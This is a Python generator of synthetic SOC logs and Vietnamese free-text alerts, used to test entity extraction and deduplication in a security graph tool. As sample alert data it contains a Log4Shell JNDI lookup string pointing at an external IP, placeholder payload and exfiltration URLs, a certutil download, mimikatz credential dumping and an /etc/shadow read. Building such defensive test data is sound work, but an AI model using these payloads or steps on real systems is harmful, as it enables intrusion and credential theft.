"""
Generate test data covering all entity types, relationships, dedup scenarios, and free text alerts.

Outputs:
  soc_logs.json     — NDJSON structured events  (upload qua File Upload panel)
  soc_freetext.txt  — plain-text alerts          (copy-paste vào Free Text panel)
"""

import json
import random
import hashlib
from datetime import datetime, timedelta

# ── Counts ─────────────────────────────────────────────────────────────────────
NUM_STRUCTURED = 1000
NUM_FREETEXT   = 25

# ── Users: short-name + email pairs để trigger email_prefix SAME_AS dedup ────
USERS_SHORT   = ["nghia",  "admin",  "dbuser",  "k8s-svc", "svc-backup", "guest"]
USERS_EMAIL   = [
    "nghia@company.vn",        # → SAME_AS "nghia"
    "admin@corp.local",        # → SAME_AS "admin"
    "attacker@malicious.io",
    "phishing@evil-corp.com",
]
ALL_USERS = USERS_SHORT + USERS_EMAIL

# ── Hosts: short-name + FQDN pairs để trigger fqdn_shortname SAME_AS dedup ──
HOSTS_SHORT = ["WIN-PC01",  "WIN-DC01",  "SRV-WEB01",  "SRV-FILE01",  "K8S-NODE01"]
HOSTS_FQDN  = [
    "WIN-PC01.corp.local",      # → SAME_AS "WIN-PC01"
    "WIN-DC01.corp.local",      # → SAME_AS "WIN-DC01"
    "SRV-WEB01.soc.lab",        # → SAME_AS "SRV-WEB01"
    "K8S-NODE01.k8s.internal",  # → SAME_AS "K8S-NODE01"
]
ALL_HOSTS = HOSTS_SHORT + HOSTS_FQDN

# ── IPs ───────────────────────────────────────────────────────────────────────
IPS_INTERNAL  = ["192.168.1.100", "192.168.1.101", "10.0.0.5",       "10.0.0.20"]
IPS_EXTERNAL  = ["185.220.101.42","203.0.113.10",  "91.108.4.1",     "45.33.32.156"]
IPS_IPV6MAPPED= ["::ffff:192.168.1.100", "::ffff:10.0.0.5"]   # test EntityNormalizer.ip()
ALL_IPS       = IPS_INTERNAL + IPS_EXTERNAL

# ── Domains ───────────────────────────────────────────────────────────────────
DOMAINS_LEGIT     = ["github.com",     "microsoft.com",     "update.company.vn"]
DOMAINS_MALICIOUS = ["evil-c2.onion.ws","malware-download.net","phish-bank.tk","c2-server.ru"]
DOMAINS_TRAILING  = ["evil-c2.onion.ws.", "phish-bank.tk."]  # test EntityNormalizer.domain()
ALL_DOMAINS = DOMAINS_LEGIT + DOMAINS_MALICIOUS

# ── New entity type pools ─────────────────────────────────────────────────────
URLS = [
    "http://evil-c2.onion.ws/payload.exe",
    "https://phish-bank.tk/login",
    "http://malware-download.net/dropper.ps1",
    "http://185.220.101.42:8080/cmd",
    "https://evil-corp.com/exfil?data=sensitive",
    "https://github.com/legit/repo",             # legit — đa dạng hóa
]

PROCESSES = [
    "mimikatz.exe",
    "powershell.exe",
    "cmd.exe",
    "wscript.exe",
    "regsvr32.exe",
    "certutil.exe",
    "psexec.exe",
    "C:\\Windows\\System32\\rundll32.exe",   # test processName() basename extraction
    "C:\\Temp\\dropper.exe",
]

CLOUD_RESOURCES = [
    "arn:aws:s3:::sensitive-bucket-prod",
    "arn:aws:s3:::backup-logs-archive",
    "arn:aws:ec2:ap-southeast-1:123456789012:instance/i-0abcd1234efgh5678",
    "/subscriptions/xxxx/resourceGroups/prod-rg/virtualMachines/vm-prod-01",
    "projects/my-project/zones/asia-east1-b/instances/gke-node-01",
]

EMAILS_VICTIM   = ["ceo@company.vn",     "finance@company.vn", "hr@company.vn"]
EMAILS_ATTACKER = ["attacker@malicious.io","phishing@evil-corp.com","spear@apt-group.net"]
ALL_EMAILS = EMAILS_VICTIM + EMAILS_ATTACKER

CVES = [
    "CVE-2021-44228",  # Log4Shell
    "CVE-2023-23397",  # Outlook NTLM relay
    "CVE-2022-30190",  # Follina / msdt
    "CVE-2021-34527",  # PrintNightmare
    "CVE-2020-1472",   # Zerologon
    "cve-2021-44228",  # lowercase → test EntityNormalizer.cveId() uppercase
]

# Fixed hashes (reused across events để test ON MATCH SET merge)
KNOWN_HASHES = [
    hashlib.sha256(f"known-{i}".encode()).hexdigest() for i in range(6)
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def random_hash():
    return hashlib.sha256(str(random.random()).encode()).hexdigest()

def random_ts(days_back=7):
    base = datetime.utcnow() - timedelta(days=days_back)
    return (base + timedelta(seconds=random.randint(0, days_back * 86400))).isoformat() + "Z"

def weighted_choice(population, weights):
    return random.choices(population, weights=weights, k=1)[0]


# ── Event generators ──────────────────────────────────────────────────────────

def auth_event():
    # Occasionally use FQDN host or email user → triggers SAME_AS later
    user = weighted_choice(ALL_USERS, [3,3,2,2,2,2,  2,2,1,1])
    host = weighted_choice(ALL_HOSTS, [3,3,2,2,2,  2,2,2,2])
    ip   = random.choice(ALL_IPS + IPS_IPV6MAPPED)
    return {
        "eventType":   "AUTHENTICATION",
        "username":    user,
        "ipAddress":   ip,
        "workstation": host,
        "success":     random.random() > 0.15,
        "timestamp":   random_ts(),
    }


def process_event():
    proc = random.choice(PROCESSES)
    # 40% chance reuse a known hash → test MERGE count increment
    fhash = random.choice(KNOWN_HASHES) if random.random() < 0.4 else random_hash()
    return {
        "eventType":   "PROCESS",
        "processName": proc,
        "processPath": f"C:\\Windows\\System32\\{proc}",
        "fileHash":    fhash,
        "commandLine": f"{proc} -enc dGVzdA==",
        "timestamp":   random_ts(),
        "rawData": {
            "hostname": random.choice(ALL_HOSTS),
        },
    }


def network_event():
    src = random.choice(ALL_IPS)
    dst = random.choice(ALL_IPS)
    while dst == src:
        dst = random.choice(ALL_IPS)
    dom = random.choice(ALL_DOMAINS + DOMAINS_TRAILING)  # test trailing-dot normalizer
    return {
        "eventType":  "NETWORK",
        "srcIp":      src,
        "dstIp":      dst,
        "dstDomain":  dom,
        "dstPort":    random.choice([80, 443, 8080, 4444, 3389]),
        "timestamp":  random_ts(),
    }


def alert_event():
    scenario = random.choice([
        "user_ip", "user_ip", "user_ip",           # 3× — most common, covers original fields
        "filehash_ip",
        "host_ip",
        "domain_ip",
        "url_only",     "url_ip",                  # URL entity
        "process_host", "process_only",             # Process entity
        "cloud_user",   "cloud_only",               # CloudResource entity
        "email_user",   "email_only",               # Email entity
        "cve_host",     "cve_only",                 # CVE entity
        "full_blast",                               # tất cả cùng một lúc
    ])

    base = {
        "eventType":   "ALERT",
        "severity":    random.choice(["LOW","MEDIUM","HIGH","CRITICAL"]),
        "description": "Security alert from SOC detection engine",
        "timestamp":   random_ts(),
    }

    if scenario == "user_ip":
        base.update({
            "alertName":  random.choice(["Brute Force Login","Pass-the-Hash","Credential Dumping"]),
            "targetUser": random.choice(ALL_USERS),
            "targetIp":   random.choice(ALL_IPS),
        })

    elif scenario == "filehash_ip":
        base.update({
            "alertName":     "Malware Detected",
            "targetFileHash": random.choice(KNOWN_HASHES),  # reuse → ON MATCH SET
            "targetIp":       random.choice(IPS_EXTERNAL),
        })

    elif scenario == "host_ip":
        base.update({
            "alertName":  "Lateral Movement",
            "targetHost": random.choice(ALL_HOSTS),
            "targetIp":   random.choice(ALL_IPS),
        })

    elif scenario == "domain_ip":
        base.update({
            "alertName":    "C2 Communication",
            "targetDomain": random.choice(DOMAINS_MALICIOUS),
            "targetIp":     random.choice(IPS_EXTERNAL),
        })

    elif scenario in ("url_only", "url_ip"):
        base.update({
            "alertName": random.choice(["Phishing URL Accessed","C2 Callback","Malicious Download"]),
            "targetUrl": random.choice(URLS),
        })
        if scenario == "url_ip":
            base["targetIp"] = random.choice(IPS_EXTERNAL)

    elif scenario in ("process_only", "process_host"):
        base.update({
            "alertName":     random.choice(["LOLBIN Abuse","Credential Dumping (Mimikatz)","Suspicious Execution"]),
            "targetProcess": random.choice(PROCESSES),
        })
        if scenario == "process_host":
            base["targetHost"] = random.choice(ALL_HOSTS)

    elif scenario in ("cloud_only", "cloud_user"):
        base.update({
            "alertName":            random.choice(["Unusual S3 Access","Lateral Movement to Cloud","Sensitive Data Exfiltration"]),
            "targetCloudResourceId": random.choice(CLOUD_RESOURCES),
        })
        if scenario == "cloud_user":
            base["targetUser"] = random.choice(USERS_SHORT)

    elif scenario in ("email_only", "email_user"):
        base.update({
            "alertName":   random.choice(["Spear Phishing","Business Email Compromise","Phishing Attachment"]),
            "targetEmail": random.choice(ALL_EMAILS),
        })
        if scenario == "email_user":
            base["targetUser"] = random.choice(USERS_SHORT)

    elif scenario in ("cve_only", "cve_host"):
        base.update({
            "alertName": random.choice(["Log4Shell Exploitation","PrintNightmare","Zerologon Attack","Follina Exploit"]),
            "targetCve": random.choice(CVES),
        })
        if scenario == "cve_host":
            base["targetHost"] = random.choice(ALL_HOSTS)

    elif scenario == "full_blast":
        # một alert có đủ hết để test toàn bộ saveAlert() branches
        base.update({
            "alertName":             "APT Full Chain Detected",
            "severity":              "CRITICAL",
            "targetUser":            random.choice(USERS_SHORT),
            "targetIp":              random.choice(IPS_EXTERNAL),
            "targetHost":            random.choice(HOSTS_SHORT),
            "targetDomain":          random.choice(DOMAINS_MALICIOUS),
            "targetFileHash":        random.choice(KNOWN_HASHES),
            "targetUrl":             random.choice(URLS),
            "targetProcess":         random.choice(PROCESSES),
            "targetCloudResourceId": random.choice(CLOUD_RESOURCES),
            "targetEmail":           random.choice(ALL_EMAILS),
            "targetCve":             random.choice(CVES),
        })

    return base


# ── Free-text alerts ──────────────────────────────────────────────────────────

FREETEXT_TEMPLATES = [
    # Auth / brute-force
    "Phát hiện đăng nhập đáng ngờ lúc 3 giờ sáng từ IP nước ngoài 185.220.101.42 vào domain controller WIN-DC01, tài khoản admin bị khóa sau 15 lần thất bại",
    "User nghia đăng nhập thành công vào SRV-FILE01 từ địa chỉ IP 203.0.113.10 không thuộc dải mạng nội bộ",
    "Cảnh báo: tài khoản svc-backup đăng nhập vào WIN-PC01 lúc 02:15 UTC — bất thường vì account này thường chỉ chạy batch job ban ngày",
    "Brute-force SSH từ IP 45.33.32.156 nhắm vào SRV-WEB01, đã thử 500 lần trong 5 phút, tài khoản guest bị khai thác thành công",

    # Malware / process
    "Phát hiện mimikatz.exe chạy với quyền SYSTEM trên WIN-DC01 — nghi ngờ kẻ tấn công đang dump credential từ LSASS",
    "certutil.exe bị lạm dụng để tải file từ http://malware-download.net/dropper.ps1 về máy SRV-WEB01, đây là dấu hiệu LOLBIN abuse",
    "Powershell.exe chạy lệnh mã hóa base64 trên WIN-PC01, commandLine chứa -enc và -nop — khả năng cao là malicious script loader",
    "wscript.exe spawn cmd.exe trên K8S-NODE01 từ thư mục Temp, hash file chưa có trong whitelist",

    # Network / C2
    "Máy WIN-PC01 kết nối ra ngoài tới IP 91.108.4.1 cổng 4444 — đây là dải IP Tor exit node, nghi C2 callback",
    "DNS query bất thường từ SRV-FILE01 tới domain evil-c2.onion.ws với tần suất 30 giây một lần — dấu hiệu DNS tunneling",
    "Phát hiện traffic HTTP tới http://185.220.101.42:8080/cmd từ user nghia@company.vn — URL có pattern của command-and-control",

    # Phishing / email
    "Email từ attacker@malicious.io gửi tới ceo@company.vn với attachment Invoice_2024.exe — người dùng đã mở file",
    "Spear phishing phát hiện: phishing@evil-corp.com mạo danh HR gửi link đổi mật khẩu giả tới finance@company.vn",
    "Business email compromise: email từ domain evil-corp.com giả mạo CFO yêu cầu chuyển khoản khẩn",

    # Cloud
    "Tài khoản admin truy cập S3 bucket arn:aws:s3:::sensitive-bucket-prod từ IP bên ngoài lúc nửa đêm — không có change request nào",
    "API call GetSecretValue vào AWS Secrets Manager từ EC2 instance i-0abcd1234efgh5678 tại vùng ap-southeast-1 — instance này không được phép đọc secret",
    "Phát hiện exfiltration: 50GB data từ arn:aws:s3:::backup-logs-archive được tải về IP 203.0.113.10 trong 20 phút",

    # CVE / exploit
    "Alert CVE-2021-44228 (Log4Shell): request JNDI lookup ${jndi:ldap://91.108.4.1/a} phát hiện trong log SRV-WEB01",
    "CVE-2020-1472 (Zerologon) exploitation attempt từ IP 185.220.101.42 nhắm vào domain controller WIN-DC01",
    "CVE-2022-30190 (Follina/msdt): WINWORD.EXE spawn msdt.exe trên WIN-PC01, user mở file Word độc hại qua email phishing",
    "PrintNightmare CVE-2021-34527: spoolsv.exe load DLL lạ từ path UNC \\\\185.220.101.42\\share — privilege escalation attempt",

    # Mixed / multi-entity
    "Tấn công chuỗi: 185.220.101.42 brute-force vào admin@corp.local → đăng nhập WIN-DC01 → chạy mimikatz.exe → lateral move sang SRV-FILE01 → exfil 30GB qua port 443",
    "Ransomware activity: attacker@malicious.io gửi phishing → user nghia click link phish-bank.tk → download dropper.ps1 → mã hóa toàn bộ SRV-FILE01.corp.local",
    "APT activity: CVE-2021-44228 exploit từ 91.108.4.1 vào SRV-WEB01 → spawn powershell.exe download payload từ evil-c2.onion.ws → C2 callback qua DNS tunneling → truy cập S3 bucket sensitive-bucket-prod",
    "Bất thường nghiêm trọng: tài khoản k8s-svc truy cập pod secrets trên K8S-NODE01.k8s.internal lúc 4AM, sau đó lateral move sang gke-node-01 và đọc /etc/shadow",
]


# ── Main ──────────────────────────────────────────────────────────────────────

def generate_structured():
    weights = {"AUTH": 40, "PROCESS": 20, "NETWORK": 15, "ALERT": 25}
    events  = []
    for _ in range(NUM_STRUCTURED):
        kind = weighted_choice(list(weights.keys()), list(weights.values()))
        if kind == "AUTH":
            events.append(auth_event())
        elif kind == "PROCESS":
            events.append(process_event())
        elif kind == "NETWORK":
            events.append(network_event())
        else:
            events.append(alert_event())
    return events


if __name__ == "__main__":
    # ── Structured logs ────────────────────────────────────────────────────────
    structured = generate_structured()

    # Đảm bảo ít nhất 1 "full_blast" alert luôn có trong file
    structured.append({
        "eventType":             "ALERT",
        "alertName":             "APT Full Chain Detected",
        "severity":              "CRITICAL",
        "description":           "Multi-entity alert: all entity types in one event",
        "targetUser":            "nghia",
        "targetIp":              "185.220.101.42",
        "targetHost":            "WIN-DC01",
        "targetDomain":          "evil-c2.onion.ws",
        "targetFileHash":        KNOWN_HASHES[0],
        "targetUrl":             "http://evil-c2.onion.ws/payload.exe",
        "targetProcess":         "mimikatz.exe",
        "targetCloudResourceId": "arn:aws:s3:::sensitive-bucket-prod",
        "targetEmail":           "attacker@malicious.io",
        "targetCve":             "CVE-2021-44228",
        "timestamp":             random_ts(),
    })

    # Đảm bảo các cặp dedup entities đều có mặt
    dedup_seeds = [
        # Auth từ email username → SAME_AS với short username
        {"eventType":"AUTHENTICATION","username":"nghia@company.vn","ipAddress":"192.168.1.100","workstation":"WIN-PC01","success":True,"timestamp":random_ts()},
        {"eventType":"AUTHENTICATION","username":"admin@corp.local","ipAddress":"10.0.0.5","workstation":"WIN-DC01","success":True,"timestamp":random_ts()},
        # Auth từ FQDN hostname → SAME_AS với short hostname
        {"eventType":"AUTHENTICATION","username":"nghia","ipAddress":"192.168.1.100","workstation":"WIN-PC01.corp.local","success":True,"timestamp":random_ts()},
        {"eventType":"AUTHENTICATION","username":"admin","ipAddress":"10.0.0.5","workstation":"WIN-DC01.corp.local","success":True,"timestamp":random_ts()},
        {"eventType":"AUTHENTICATION","username":"dbuser","ipAddress":"10.0.0.20","workstation":"SRV-WEB01.soc.lab","success":True,"timestamp":random_ts()},
    ]
    structured.extend(dedup_seeds)

    random.shuffle(structured)

    with open("soc_logs.json", "w", encoding="utf-8") as f:
        for ev in structured:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")

    # ── Free-text alerts ───────────────────────────────────────────────────────
    sample = random.sample(FREETEXT_TEMPLATES, min(NUM_FREETEXT, len(FREETEXT_TEMPLATES)))

    with open("soc_freetext.txt", "w", encoding="utf-8") as f:
        f.write("# Copy từng dòng vào ô 'Nhập Alert (Free Text)' trên giao diện\n")
        f.write("# Mỗi dòng là một alert riêng biệt\n\n")
        for line in sample:
            f.write(line + "\n\n")

    # ── Summary ────────────────────────────────────────────────────────────────
    counts = {}
    for ev in structured:
        k = ev.get("eventType","?")
        counts[k] = counts.get(k, 0) + 1

    new_entity_counts = {k: 0 for k in ["targetUrl","targetProcess","targetCloudResourceId","targetEmail","targetCve"]}
    for ev in structured:
        for field in new_entity_counts:
            if ev.get(field):
                new_entity_counts[field] += 1

    dedup_users = sum(1 for ev in structured if ev.get("eventType")=="AUTHENTICATION" and "@" in (ev.get("username","") or ""))
    dedup_hosts = sum(1 for ev in structured if ev.get("eventType")=="AUTHENTICATION" and "." in (ev.get("workstation","") or ""))

    print(f"\n✓ soc_logs.json — {len(structured)} events")
    for t, n in sorted(counts.items()):
        print(f"  {t:20s}: {n}")
    print(f"\n  New entity types in ALERTs:")
    for field, n in new_entity_counts.items():
        print(f"  {field:30s}: {n}")
    print(f"\n  Dedup seeds:")
    print(f"  email-username (SAME_AS users)  : {dedup_users}")
    print(f"  FQDN hostname  (SAME_AS hosts)  : {dedup_hosts}")
    print(f"\n✓ soc_freetext.txt — {len(sample)} free-text alerts")
    print(f"\n  Upload soc_logs.json qua File Upload panel")
    print(f"  Copy từng dòng trong soc_freetext.txt vào Free Text panel\n")
